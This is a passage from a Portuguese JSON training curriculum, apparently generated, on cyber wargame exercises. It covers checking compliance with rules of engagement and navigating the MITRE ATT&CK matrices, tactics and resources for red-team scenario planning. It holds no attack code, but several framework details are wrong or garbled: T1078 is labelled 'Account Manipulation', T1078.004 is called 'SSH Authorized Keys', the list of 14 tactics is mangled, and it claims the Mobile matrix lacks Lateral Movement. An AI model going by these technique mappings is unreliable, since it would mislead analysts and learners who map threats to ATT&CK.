                              "realWorldApplication": "Em operações cibernéticas reais, como exercícios da OTAN (ex.: Locked Shields), cenários são adaptados às ROE para evitar escaladas acidentais, garantindo treinamentos realistas sem violar tratados internacionais como a Convenção de Tallinn sobre ciberoperações."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.4.3.3",
                            "name": "Validar conformidade em testes finais",
                            "description": "Executar rodadas de teste integradas para confirmar que todas as ações nos ambientes respeitam as ROE, registrando desvios e correções.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar Ambiente de Teste e Revisar ROE",
                                  "subSteps": [
                                    "Reunir documentação completa das Regras de Engajamento (ROE) relevantes ao cenário.",
                                    "Configurar o ambiente de simulação cibernética com todos os componentes integrados (redes, VMs, ferramentas de monitoramento).",
                                    "Definir scripts de teste automatizados e manuais que cubram ações críticas.",
                                    "Executar verificação inicial de baseline para garantir integridade do ambiente.",
                                    "Criar log de pré-teste para registrar estado inicial."
                                  ],
                                  "verification": "Checklist assinada confirmando configuração do ambiente e revisão das ROE sem discrepâncias iniciais.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Documentos ROE, ferramentas de simulação (ex: Cyber Range, Wireshark), VMs configuradas, scripts de teste.",
                                  "tips": "Use diagramas visuais para mapear ROE às ações de teste para facilitar a revisão.",
                                  "learningObjective": "Entender e aplicar ROE no contexto de ambientes simulados cibernéticos.",
                                  "commonMistakes": "Ignorar ROE contextuais específicos do cenário, levando a configurações inválidas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar Rodadas de Teste Integradas",
                                  "subSteps": [
                                    "Iniciar primeira rodada de testes com ações de baixo risco para validar setup.",
                                    "Executar ações sequenciais de teste, monitorando em tempo real conformidade com ROE.",
                                    "Registrar métricas de performance e logs de todas as interações em ferramenta centralizada.",
                                    "Pausar e analisar qualquer desvio detectado durante a execução.",
                                    "Repetir rodadas adicionais (mínimo 3) com variações de cenários para cobertura completa."
                                  ],
                                  "verification": "Logs de teste completos com timestamps mostrando execução de todas as rodadas sem falhas críticas no setup.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ferramentas de monitoramento (SIEM, ELK Stack), scripts automatizados, ambiente de cyber range ativo.",
                                  "tips": "Monitore múltiplos vetores simultaneamente (rede, aplicação, usuário) para capturar interações complexas.",
                                  "learningObjective": "Executar testes integrados que simulem operações reais respeitando limites éticos e operacionais.",
                                  "commonMistakes": "Executar testes sem monitoramento em tempo real, perdendo desvios sutis."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Registrar Desvios e Implementar Correções",
                                  "subSteps": [
                                    "Analisar logs para identificar todos os desvios de ROE (ex: ações não autorizadas, escaladas indevidas).",
                                    "Classificar desvios por severidade (crítico, médio, baixo) e impacto potencial.",
                                    "Documentar cada desvio com evidências (screenshots, logs) e causa raiz.",
                                    "Implementar correções nos scripts/ambientes e retestar o desvio específico.",
                                    "Atualizar log central com status de correção e lições aprendidas."
                                  ],
                                  "verification": "Relatório de desvios com 100% dos itens classificados, corrigidos e retestados com sucesso.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": "Ferramentas de análise de logs (Splunk, Kibana), templates de relatório de desvios, acesso de edição ao ambiente.",
                                  "tips": "Use categorização padronizada (ex: MITRE ATT&CK alinhada a ROE) para agilizar análise.",
                                  "learningObjective": "Desenvolver habilidades de análise forense e correção em conformidade operacional.",
                                  "commonMistakes": "Subestimar desvios menores que podem escalar em cenários reais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Confirmar Conformidade Final e Documentar Resultados",
                                  "subSteps": [
                                    "Executar rodada final de teste end-to-end para validar todas as correções.",
                                    "Gerar relatório consolidado de conformidade com métricas quantitativas (ex: % de ações compliant).",
                                    "Obter aprovação de stakeholders simulados ou revisores.",
                                    "Arquivar todos os artefatos em repositório versionado.",
                                    "Preparar resumo executivo com recomendações para iterações futuras."
                                  ],
                                  "verification": "Relatório final aprovado confirmando 100% de conformidade em testes validados.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": "Templates de relatório final, ferramentas de versionamento (Git), acesso a stakeholders.",
                                  "tips": "Inclua visualizações (gráficos de conformidade) no relatório para comunicação clara.",
                                  "learningObjective": "Sintetizar resultados de testes em documentação acionável e verificável.",
                                  "commonMistakes": "Omitir métricas quantitativas, enfraquecendo a credibilidade do relatório."
                                }
                              ],
                              "practicalExample": "Em um cyber range simulando um ataque a infraestrutura crítica, execute testes onde ações como 'scan de rede' e 'injeção de payload' são validadas contra ROE que proíbem impactos em civis; registre desvio quando scan atinge IP não autorizado, corrija firewall rules e reteste.",
                              "finalVerifications": [
                                "Todas as ações testadas (100%) cumprem ROE sem desvios pendentes.",
                                "Logs completos auditados mostram monitoramento contínuo.",
                                "Relatório final inclui evidências de correções implementadas.",
                                "Rodada final end-to-end passou sem alertas de não-conformidade.",
                                "Métricas de cobertura de testes >95% dos cenários planejados.",
                                "Aprovação documentada de revisores independentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e classificação de desvios (sem falsos positivos/negativos).",
                                "Completude dos logs e relatórios (todos os campos preenchidos corretamente).",
                                "Eficiência nas correções (tempo de resolução < estimado).",
                                "Cobertura abrangente de rodadas de teste (mínimo 3 variações).",
                                "Qualidade da documentação (clara, visual e acionável).",
                                "Adesão estrita aos tempos estimados e materiais listados."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Direito: Alinhamento de ROE com leis internacionais de ciberconflito.",
                                "Análise de Dados: Uso de ferramentas SIEM para detecção de padrões em logs.",
                                "Gestão de Projetos: Ciclo PDCA (Plan-Do-Check-Act) em validações.",
                                "Programação: Desenvolvimento e depuração de scripts de teste automatizados."
                              ],
                              "realWorldApplication": "Durante operações cibernéticas militares reais, como em exercícios da OTAN, validar que ataques respeitam ROE para evitar escaladas desnecessárias, protegendo aliados e minimizando danos colaterais, com relatórios alimentando revisões de doutrina."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.5",
                    "name": "Uso de Frameworks de Ameaças",
                    "description": "Aplicação de modelos como MITRE ATT&CK para estruturar cenários de ameaça ofensivos.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.5.1",
                        "name": "Framework MITRE ATT&CK",
                        "description": "O MITRE ATT&CK é um modelo de conhecimento globalmente acessível que cataloga táticas, técnicas e procedimentos (TTPs) de adversários cibernéticos reais, organizado em matrizes como Enterprise, Mobile e ICS, servindo como base para planejamento ofensivo em operações de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.5.1.1",
                            "name": "Identificar as Matrizes do ATT&CK",
                            "description": "Reconhecer e diferenciar as matrizes principais do framework MITRE ATT&CK (Enterprise para ambientes corporativos, Mobile para dispositivos móveis e ICS para sistemas de controle industrial), entendendo suas aplicações em cenários de ameaça ofensivos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Introdução ao Framework MITRE ATT&CK e suas Matrizes Principais",
                                  "subSteps": [
                                    "Acesse o site oficial do MITRE ATT&CK em https://attack.mitre.org/",
                                    "Leia a seção 'About ATT&CK' para entender o propósito do framework como conhecimento compartilhado de táticas e técnicas de adversários cibernéticos",
                                    "Navegue até as matrizes disponíveis e identifique as três principais: Enterprise, Mobile e ICS",
                                    "Anote as definições básicas de cada matriz e seus escopos iniciais",
                                    "Crie um diagrama simples comparando os domínios cobertos por cada uma"
                                  ],
                                  "verification": "Produzir uma tabela ou lista com as três matrizes, seus nomes completos e uma frase resumindo o foco de cada uma",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Acesso à internet",
                                    "Site MITRE ATT&CK (https://attack.mitre.org/)",
                                    "Bloco de notas ou ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Use a busca no site para termos como 'matrices' para agilizar a navegação; foque em visão geral antes de detalhes",
                                  "learningObjective": "Compreender o framework ATT&CK como um todo e reconhecer as matrizes Enterprise, Mobile e ICS como componentes principais",
                                  "commonMistakes": [
                                    "Confundir ATT&CK com frameworks lineares como Cyber Kill Chain",
                                    "Ignorar que as matrizes são específicas por domínio e não intercambiáveis",
                                    "Não anotar fontes oficiais para referência futura"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Exploração Detalhada da Matriz Enterprise",
                                  "subSteps": [
                                    "Acesse a matriz Enterprise em https://attack.mitre.org/matrices/enterprise/",
                                    "Identifique as 14 táticas principais (ex: Reconnaissance, Initial Access) e técnicas associadas",
                                    "Estude exemplos de grupos adversários (APTs) mapeados nessa matriz",
                                    "Analise como ela se aplica a ambientes corporativos como redes Windows/Linux e nuvem",
                                    "Registre 3-5 técnicas comuns em cenários ofensivos corporativos"
                                  ],
                                  "verification": "Listar 5 táticas da matriz Enterprise com uma técnica exemplo cada e explicar sua relevância em ataques corporativos",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Site MITRE ATT&CK Enterprise Matrix",
                                    "Navegador web com abas múltiplas",
                                    "Planilha para registrar táticas (Google Sheets ou Excel)"
                                  ],
                                  "tips": "Use o filtro 'Show Techniques' para visualizar detalhes; clique em técnicas para ver sub-técnicas e mitigações",
                                  "learningObjective": "Dominar a estrutura e aplicação da matriz Enterprise em ameaças a infraestruturas corporativas",
                                  "commonMistakes": [
                                    "Focar apenas em táticas sem explorar técnicas e sub-técnicas",
                                    "Não conectar técnicas a grupos reais de threat actors",
                                    "Confundir com matrizes de outros domínios"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Análise das Matrizes Mobile e ICS",
                                  "subSteps": [
                                    "Acesse a matriz Mobile em https://attack.mitre.org/matrices/mobile/ e identifique táticas como Reconnaissance e Privilege Escalation adaptadas a apps e dispositivos móveis",
                                    "Navegue à matriz ICS em https://attack.mitre.org/matrices/ics/ e note táticas específicas como Inhibit Response Function para sistemas de controle industrial",
                                    "Compare colunas táticas entre Mobile/ICS e Enterprise para destacar diferenças",
                                    "Identifique exemplos de ameaças: apps maliciosos para Mobile, Stuxnet-like para ICS",
                                    "Anote cenários ofensivos onde cada uma é usada (ex: espionagem via mobile, sabotagem industrial)"
                                  ],
                                  "verification": "Criar um mapa mental ou tabela comparativa das táticas únicas de Mobile e ICS vs. Enterprise",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Sites MITRE ATT&CK Mobile e ICS Matrices",
                                    "Ferramenta de mind mapping como MindMeister ou papel/caneta"
                                  ],
                                  "tips": "Procure por 'matrix navigator' no site para visualizações interativas; priorize táticas de alto impacto",
                                  "learningObjective": "Diferenciar as matrizes Mobile e ICS da Enterprise, focando em aplicações ofensivas específicas",
                                  "commonMistakes": [
                                    "Subestimar diferenças: Mobile não tem 'Lateral Movement' como Enterprise",
                                    "Não explorar mitigações ICS-specific como air-gapping",
                                    "Misturar exemplos de ameaças entre matrizes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciação e Aplicações em Cenários de Ameaça Ofensivos",
                                  "subSteps": [
                                    "Compile notas das três matrizes e crie critérios de seleção: Enterprise para IT corporativa, Mobile para endpoints móveis, ICS para OT",
                                    "Simule cenários: escolha matriz para um ataque a fábrica (ICS), app bancário (Mobile), rede corporativa (Enterprise)",
                                    "Explore recursos como ATT&CK Navigator para sobrepor matrizes e visualizar gaps",
                                    "Discuta limitações: Enterprise é mais madura, Mobile/ICS emergentes",
                                    "Prepare um resumo de quando usar cada matriz em planejamento ofensivo"
                                  ],
                                  "verification": "Desenvolver 3 cenários hipotéticos e justificar a matriz escolhida para cada, com pelo menos 2 táticas relevantes",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "ATT&CK Navigator (https://mitre-attack.github.io/attack-navigator/)",
                                    "Notas dos steps anteriores"
                                  ],
                                  "tips": "Use layers no Navigator para comparar matrizes; pratique verbalizando escolhas para reforço",
                                  "learningObjective": "Aplicar conhecimento para selecionar e justificar matrizes em cenários reais de threat modeling ofensivo",
                                  "commonMistakes": [
                                    "Selecionar Enterprise por default sem considerar contexto",
                                    "Ignorar overlaps entre matrizes em ambientes híbridos",
                                    "Não validar com exemplos reais de threat reports"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team para uma empresa manufatureira, o analista identifica que um cenário de intrusão em PLCs usa a Matriz ICS (tática 'Inhibit Response Function' via técnica 'Manipulation of Control'), diferenciando da Matriz Enterprise usada para comprometer servidores IT corporativos e Mobile para roubo de dados via app de controle remoto.",
                              "finalVerifications": [
                                "Listar corretamente as três matrizes principais e seus domínios específicos",
                                "Descrever pelo menos 3 táticas únicas de cada matriz",
                                "Justificar a escolha de uma matriz para um cenário dado com precisão",
                                "Identificar pelo menos 2 diferenças chave entre Enterprise e ICS",
                                "Demonstrar uso básico do ATT&CK Navigator para comparação",
                                "Explicar aplicações ofensivas sem confundir domínios"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e descrição das matrizes (90% acurácia)",
                                "Profundidade na diferenciação de táticas e técnicas por domínio",
                                "Capacidade de aplicar em cenários realistas com justificativa lógica",
                                "Uso correto de terminologia oficial do MITRE",
                                "Completude das verificações e exemplos práticos",
                                "Criatividade e relevância nas conexões interdisciplinares"
                              ],
                              "crossCurricularConnections": [
                                "Threat Intelligence: Mapeamento de IOCs de adversários em táticas ATT&CK",
                                "Network Security: Análise de tráfego alinhada a Initial Access e Lateral Movement",
                                "Industrial Control Systems (ICS/OT): Integração com protocolos como Modbus/DNP3",
                                "Mobile Security: Ligação com análise de apps Android/iOS e MDM",
                                "Incident Response: Uso de ATT&CK para hunting e triagem de alertas"
                              ],
                              "realWorldApplication": "Analistas de SOC e Red Teams usam as matrizes ATT&CK para mapear ataques reais, como o SolarWinds (Enterprise), Pegasus spyware (Mobile) ou TRITON malware (ICS), permitindo planejamento defensivo proativo, simulações de threat hunting e relatórios de conformidade em organizações como utilities e bancos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.1.2",
                            "name": "Navegar pela Estrutura de Táticas e Técnicas",
                            "description": "Explorar a hierarquia do framework, identificando as 14 táticas principais (como Reconhecimento, Execução e Persistência) e suas sub-técnicas associadas, com exemplos de IDs como T1078 para Account Manipulation.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Acessar o Framework MITRE ATT&CK e Compreender a Hierarquia Geral",
                                  "subSteps": [
                                    "Acesse o site oficial do MITRE ATT&CK em attack.mitre.org",
                                    "Navegue até a seção 'Enterprise' ou 'Matrix' para visualizar a matriz de táticas e técnicas",
                                    "Identifique a estrutura hierárquica: Grupos > Táticas > Técnicas > Sub-técnicas",
                                    "Leia a visão geral da página inicial para entender o propósito do framework",
                                    "Anote as 14 táticas principais listadas na matriz"
                                  ],
                                  "verification": "Confirme que pode listar corretamente as 14 táticas principais e descrever a hierarquia em um diagrama simples",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Navegador web, site MITRE ATT&CK (attack.mitre.org), bloco de notas",
                                  "tips": "Use o zoom da página para visualizar melhor a matriz; ative o modo escuro se disponível para conforto visual",
                                  "learningObjective": "Entender a arquitetura de alto nível do framework MITRE ATT&CK",
                                  "commonMistakes": "Confundir o framework ATT&CK com outros como CAPEC; ignorar a distinção entre matrizes (Enterprise, Mobile, ICS)"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar e Memorizar as 14 Táticas Principais",
                                  "subSteps": [
                                    "Clique na aba 'Tactics' ou passe o mouse sobre cada coluna da matriz para ver as 14 táticas",
                                    "Liste as táticas: Reconhecimento, Posicionamento de Recursos, Descoberta, Acesso Inicial, Execução, Persistência, Privilégios Elevados, Defesa Evasão, Credenciais Acesso, Descoberta Lateral, Coleta, Comando e Controle, Exfiltração, Impacto",
                                    "Para cada tática, leia a descrição breve e identifique 2-3 exemplos de técnicas associadas",
                                    "Crie um mapa mental conectando táticas sequenciais no kill chain",
                                    "Compare com o modelo MITRE D3FEND para oposições defensivas"
                                  ],
                                  "verification": "Recite as 14 táticas em ordem cronológica de um ataque típico sem consultar a página",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Site MITRE ATT&CK, ferramenta de mapa mental (ex: Draw.io ou papel e caneta)",
                                  "tips": "Associe cada tática a uma fase do ciclo de vida de um ataque cyber para facilitar memorização",
                                  "learningObjective": "Dominar a identificação e sequência das 14 táticas principais",
                                  "commonMistakes": "Memorizar apenas nomes sem entender o propósito; pular táticas menos comuns como 'Impacto'"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Navegar para Técnicas e Sub-técnicas Específicas",
                                  "subSteps": [
                                    "Selecione uma tática, como 'Persistência', e clique para expandir suas técnicas",
                                    "Explore IDs de técnicas (ex: T1078 - Account Manipulation) clicando neles para ver detalhes",
                                    "Analise seções como Descrição, Procedimentos, Mitigações e Detecções para cada técnica",
                                    "Identifique sub-técnicas (ex: T1078.002 - Domain Account) e suas variações",
                                    "Busque por grupos de adversários (ex: APT28) que usam essas técnicas"
                                  ],
                                  "verification": "Localize e descreva completamente a técnica T1078, incluindo pelo menos 3 procedimentos e 2 mitigações",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Site MITRE ATT&CK, captura de tela ou PDF exportado da técnica",
                                  "tips": "Use a barra de pesquisa para IDs específicos; filtre por plataforma (Windows, Linux) relevante",
                                  "learningObjective": "Habilitar navegação fluida entre táticas, técnicas e sub-técnicas com compreensão de detalhes",
                                  "commonMistakes": "Não expandir sub-técnicas; confundir procedimentos com atomic tests"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Mapeamento de Cenários com Exemplos de IDs",
                                  "subSteps": [
                                    "Escolha um cenário de ataque (ex: ransomware) e mapeie táticas/técnicas envolvidas",
                                    "Pesquise IDs como T1078, T1059 (Command and Scripting Interpreter) e anote caminhos de navegação",
                                    "Crie uma trilha de ataque personalizada ligando 5-7 técnicas sequenciais",
                                    "Valide o mapeamento consultando a Navigator tool no site",
                                    "Exporte ou anote a trilha para uso futuro"
                                  ],
                                  "verification": "Demonstre uma trilha de ataque válida com pelo menos 4 técnicas corretamente navegadas e mapeadas",
                                  "estimatedTime": "30 minutos",
                                  "materials": "MITRE ATT&CK Navigator (app.attack.mitre.org), site principal",
                                  "tips": "Comece com táticas iniciais como Reconhecimento para cenários realistas; use camadas no Navigator",
                                  "learningObjective": "Aplicar navegação para mapear cenários reais de ameaças",
                                  "commonMistakes": "Criar trilhas não sequenciais; ignorar dependências entre técnicas"
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team, navegue até a tática 'Persistência' (TA0003), encontre T1078.004 (SSH Authorized Keys), analise seus procedimentos para persistir em um servidor Linux via chaves SSH, e mapeie para detecções como monitoramento de arquivos ~/.ssh/authorized_keys.",
                              "finalVerifications": [
                                "Liste as 14 táticas em ordem sem erros",
                                "Navegue e descreva detalhes de 3 técnicas com IDs específicos (ex: T1078, T1059, T1021)",
                                "Crie uma trilha de ataque simples com 5 técnicas conectadas",
                                "Identifique mitigações para pelo menos 2 técnicas exploradas",
                                "Use o Navigator para visualizar uma matriz personalizada",
                                "Explique a diferença entre táticas, técnicas e sub-técnicas"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação das 14 táticas (100% correto)",
                                "Profundidade na descrição de pelo menos 3 técnicas (incluindo procedimentos e mitigações)",
                                "Capacidade de mapear uma trilha de ataque lógica e sequencial",
                                "Uso correto de ferramentas como Navigator sem erros de navegação",
                                "Demonstração de conexões com cenários reais de ameaças",
                                "Tempo de navegação eficiente (menos de 2 minutos por técnica)"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Mapeamento de trilhas como grafos de rede",
                                "Programação: Automatização de consultas via MITRE ATT&CK STIX/TAXII API",
                                "Gestão de Projetos: Sequenciamento de fases de ataque similar a metodologias ágeis",
                                "Inteligência de Negócios: Análise de ameaças como BI para priorização de defesas"
                              ],
                              "realWorldApplication": "Durante operações de Threat Hunting em uma SOC, navegadores usam o framework para mapear IOCs observados a táticas como 'Execução' (TA0002), priorizando investigações e melhorando respostas a incidentes em tempo real."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.1.3",
                            "name": "Acessar Recursos Oficiais do ATT&CK",
                            "description": "Utilizar o site oficial do MITRE ATT&CK para buscar grupos de adversários (APTs), mitigações e detecções, aplicando filtros para cenários específicos de jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Acessar o Site Oficial do MITRE ATT&CK e Familiarizar com a Interface",
                                  "subSteps": [
                                    "Abra o navegador e navegue para https://attack.mitre.org/",
                                    "Explore o menu principal: Matrices, Groups, Techniques, Mitigations e Software",
                                    "Identifique as seções relevantes para APTs (Groups), Mitigations e Detections",
                                    "Use a barra de pesquisa para testar uma consulta simples, como 'APT29'",
                                    "Anote a estrutura das páginas de resultados"
                                  ],
                                  "verification": "Confirme que você pode carregar a página inicial e navegar para pelo menos três seções principais sem erros",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Navegador web atualizado (Chrome ou Firefox)",
                                    "Conexão à internet estável"
                                  ],
                                  "tips": "Use modo incógnito para evitar cache antigo; ative JavaScript se necessário",
                                  "learningObjective": "Dominar a navegação básica no site ATT&CK para acesso eficiente",
                                  "commonMistakes": [
                                    "Acessar sites falsos ou mirrors não oficiais",
                                    "Ignorar atualizações recentes no framework"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Pesquisar e Explorar Grupos de Adversários (APTs)",
                                  "subSteps": [
                                    "Navegue para a seção 'Groups' no menu",
                                    "Use filtros como 'Advanced Search' para selecionar por país, setor alvo ou táticas",
                                    "Selecione um grupo exemplo (ex: APT28) e revise táticas, técnicas e procedimentos (TTPs)",
                                    "Exporte ou capture dados relevantes em um documento",
                                    "Compare dois grupos para identificar similaridades"
                                  ],
                                  "verification": "Liste 5 APTs relevantes com pelo menos uma tática cada, comprovando via screenshots",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Bloco de notas ou ferramenta de captura de tela (Snipping Tool)",
                                    "Site ATT&CK"
                                  ],
                                  "tips": "Priorize grupos ativos recentemente; use Ctrl+F para buscas rápidas em páginas",
                                  "learningObjective": "Habilitar busca precisa de perfis de adversários para modelagem de ameaças",
                                  "commonMistakes": [
                                    "Confundir grupos com software malicioso",
                                    "Não verificar datas de última atividade"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Buscar Mitigações e Detecções Associadas",
                                  "subSteps": [
                                    "Acesse as seções 'Mitigations' e 'Detections' via menu ou links de grupos",
                                    "Filtre mitigações por técnica específica (ex: T1078 - Valid Accounts)",
                                    "Revise detecções recomendadas, incluindo regras Sigma ou EQL",
                                    "Mapeie mitigações para TTPs de um APT selecionado",
                                    "Salve links para implementação futura"
                                  ],
                                  "verification": "Crie uma tabela ligando 3 técnicas a mitigações/detecções específicas",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Planilha (Google Sheets ou Excel)",
                                    "Site ATT&CK"
                                  ],
                                  "tips": "Clique em 'Mitigations' nas páginas de técnicas para contexto direto",
                                  "learningObjective": "Aprender a extrair contramedidas acionáveis de recursos ATT&CK",
                                  "commonMistakes": [
                                    "Ignorar maturidade das detecções (ex: experimental)",
                                    "Não considerar dependências de mitigações"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Filtros para Cenários Específicos de Jogos de Guerra Cibernética",
                                  "subSteps": [
                                    "Defina um cenário hipotético (ex: ataque a infraestrutura crítica por APT chinesa)",
                                    "Use 'Browse by Scenario' ou filtros avançados para refinar resultados",
                                    "Combine grupos, técnicas e mitigações em um plano de exercício",
                                    "Valide filtros gerando uma visão personalizada (ex: Navigator layer)",
                                    "Documente o cenário completo com referências ATT&CK"
                                  ],
                                  "verification": "Produza um relatório de 1 página com cenário filtrado e justificativas",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "MITRE ATT&CK Navigator (https://mitre-attack.github.io/attack-navigator/)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Integre com ATT&CK Navigator para visualizações; teste múltiplos filtros iterativamente",
                                  "learningObjective": "Integrar recursos ATT&CK em planejamento de wargames cibernéticos",
                                  "commonMistakes": [
                                    "Filtros muito amplos levando a overload de dados",
                                    "Não alinhar com objetivos do cenário"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra simulando um ataque de APT russa a uma empresa de energia, acesse ATT&CK, filtre por grupos como APT29 (Cozy Bear), identifique técnicas como T1078 (Valid Accounts), busque mitigações como M1032 (Multi-factor Authentication) e detecções baseadas em logs de autenticação, criando um blueprint para o blue team defender.",
                              "finalVerifications": [
                                "Navegação fluida em todas as seções principais sem consulta externa",
                                "Busca bem-sucedida de 3 APTs com TTPs detalhados",
                                "Lista de 5 mitigações/detecções mapeadas corretamente",
                                "Cenário de wargame filtrado com pelo menos 10 elementos ATT&CK",
                                "Uso correto de filtros avançados comprovado por exportações",
                                "Integração com ATT&CK Navigator sem erros"
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude das buscas (90%+ match com dados oficiais)",
                                "Eficiência no uso de filtros (tempo < estimado)",
                                "Qualidade da documentação (clareza, referências hiperlinkadas)",
                                "Relevância ao contexto de wargames cibernéticos",
                                "Criatividade na aplicação de conexões entre grupos/técnicas/mitigações",
                                "Ausência de erros comuns identificados"
                              ],
                              "crossCurricularConnections": [
                                "Inteligência de Ameaças ( Threat Intelligence): Mapeamento de IOCs de APTs",
                                "Defesa em Camadas: Integração com frameworks como NIST ou CIS Controls",
                                "Simulação e Treinamento: Uso em ferramentas como Atomic Red Team",
                                "Análise Forense: Correlação de detecções com evidências",
                                "Gestão de Riscos: Priorização de mitigações por impacto"
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team em organizações como agências governamentais ou empresas Fortune 500, profissionais usam esses recursos para simular ataques realistas baseados em APTs observados, testando defesas e melhorando resiliência cibernética contra ameaças persistentes avançadas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.5.2",
                        "name": "Mapeamento de TTPs Ofensivos",
                        "description": "Processo de seleção e mapeamento de Táticas, Técnicas e Procedimentos (TTPs) do ATT&CK para simular comportamentos adversários realistas em operações cibernéticas ofensivas.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.5.2.1",
                            "name": "Selecionar Táticas Relevantes para Cenários",
                            "description": "Escolher táticas apropriadas do ATT&CK Navigator com base no objetivo do cenário, como Initial Access (TA0001) para simulações de phishing ou Lateral Movement (TA0008) para pivoting em redes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Analisar o Cenário e Definir Objetivos Claros",
                                  "subSteps": [
                                    "Identifique o objetivo principal do cenário (ex: simular phishing ou pivoting em rede).",
                                    "Liste os atores envolvidos, ambiente de rede e restrições técnicas.",
                                    "Defina métricas de sucesso para o cenário (ex: taxa de sucesso no acesso inicial).",
                                    "Documente suposições e escopo do exercício.",
                                    "Crie um diagrama simples do fluxo de ataque esperado."
                                  ],
                                  "verification": "Verifique se há um documento ou diagrama resumindo o cenário com objetivos claros e mensuráveis.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "MITRE ATT&CK Navigator (https://mitre-attack.github.io/attack-navigator/)",
                                    "Papel ou ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Comece pelo 'porquê' do cenário para evitar sobrecarga de táticas irrelevantes.",
                                  "learningObjective": "Compreender profundamente o contexto do cenário para alinhar táticas adequadamente.",
                                  "commonMistakes": "Ignorar restrições ambientais, como firewalls, levando a táticas impraticáveis."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar e Familiarizar-se com as Táticas do MITRE ATT&CK",
                                  "subSteps": [
                                    "Acesse o ATT&CK Navigator e revise as 14 táticas principais (TA0001 a TA0043).",
                                    "Estude descrições, sub-técnicas e exemplos para cada tática relevante.",
                                    "Use filtros no Navigator para visualizar matrizes de táticas por fase (ex: Enterprise).",
                                    "Anote táticas iniciais que pareçam alinhadas ao cenário.",
                                    "Compare com cenários históricos de ataques reais."
                                  ],
                                  "verification": "Crie uma lista anotada de pelo menos 5 táticas com resumos breves de cada uma.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "MITRE ATT&CK Framework (https://attack.mitre.org/)",
                                    "ATT&CK Navigator tool"
                                  ],
                                  "tips": "Use camadas no Navigator para sobrepor dados de grupos APT e visualizar caminhos comuns.",
                                  "learningObjective": "Dominar a estrutura hierárquica de táticas, técnicas e procedimentos do ATT&CK.",
                                  "commonMistakes": "Confundir táticas com técnicas, selecionando sub-técnicas prematuramente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Táticas ao Cenário Específico",
                                  "subSteps": [
                                    "Compare objetivos do cenário com descrições de cada tática (ex: TA0001 para phishing).",
                                    "Crie uma tabela de mapeamento: tática | relevância | justificativa | viabilidade.",
                                    "Elimine táticas não aplicáveis com base em escopo (ex: ignore TA0005 se não houver defensores).",
                                    "Identifique sequências lógicas de táticas (ex: Initial Access → Execution → Lateral Movement).",
                                    "Valide mapeamento com referências de ataques reais (ex: SolarWinds)."
                                  ],
                                  "verification": "Produza uma tabela ou grafo no Navigator mostrando pelo menos 3-5 táticas mapeadas.",
